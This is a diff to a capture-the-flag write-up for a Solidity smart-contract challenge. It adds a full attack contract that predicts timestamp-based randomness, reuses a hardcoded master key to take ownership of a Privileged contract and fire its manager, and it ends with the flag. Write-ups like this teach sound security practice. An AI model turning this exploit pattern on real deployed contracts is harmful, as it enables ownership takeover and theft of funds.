@@ -135,7 +135,68 @@ These state variables will hold a reference to the instances of the other contra
 ```
 The constructor is a special function that is run once when the contract is deployed. In the constructor, I first require five ether to be sent along with the deployment for when we call approach. I define the setup with the address of the setup contract, which is passed in as _setup, and find the addresses of challengeManager and privileged through setup. Finally, I call approach with five ether, making our contract a challenger.
 
+### Solve
+```solidity
+    function solve() public {
+        uint256 gachaRoll = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;
+        bytes32 masterKey = 0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559;
 
+        require(gachaRoll == 1, "Try again");
+
+        challengeManager.upgradeChallengerAttribute(3, 1);
+        challengeManager.upgradeChallengerAttribute(3, 1);
+        challengeManager.upgradeChallengerAttribute(3, 1);
+        challengeManager.upgradeChallengerAttribute(3, 1);
+        
+        challengeManager.challengeCurrentOwner(masterKey);
+        privileged.fireManager();
+    }
+```
+Our solve function calculates the value of gacha and will revert, or cause the transaction to fail, if it is not 1. We will have to call the function again since if we use a loop, it will still be in the same transaction, and the block will still have the same timestamp, meaning our gacha will stay the same. If it is 1, we continue and call upgradeChallengerAttribute four times with the parameters 3 and 1. Three is the id of our contract, and the second attribute just has to be a valid id. We know that gacha will be always be 1 in these calls since the timestamp should stay the same within the same transaction. After we become the challenger, we can call challengeCurrentOwner with our master key and become the owner of privileged. Once we become the owner, we can fire the manager and solve the challenge!
+
+## Attack Contract
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+import "./Privileged.sol";
+import "./ChallengeManager.sol";
+import "./Setup.sol";
+
+contract Attack {
+    Setup public setup;
+    Privileged public privileged;
+    ChallengeManager public challengeManager;
+
+    constructor(address _setup) payable {
+        require(msg.value == 5 ether, "Need 5 ETH");
+        
+        setup = Setup(_setup);
+        challengeManager = ChallengeManager(setup.challengeManager());
+        privileged = Privileged(setup.privileged());
+
+        challengeManager.approach{value: 5 ether}();
+    }
+
+    function solve() public {
+        uint256 gachaRoll = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;
+        bytes32 masterKey = 0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559;
+
+        require(gachaRoll == 1, "Try again");
+
+        challengeManager.upgradeChallengerAttribute(3, 1);
+        challengeManager.upgradeChallengerAttribute(3, 1);
+        challengeManager.upgradeChallengerAttribute(3, 1);
+        challengeManager.upgradeChallengerAttribute(3, 1);
+        
+        challengeManager.challengeCurrentOwner(masterKey);
+        privileged.fireManager();
+    }
+}
+```
+
+### Flag
+`TCP1P{is_it_really_a_gambit_tho_its_not_that_hard}`
 
 
 
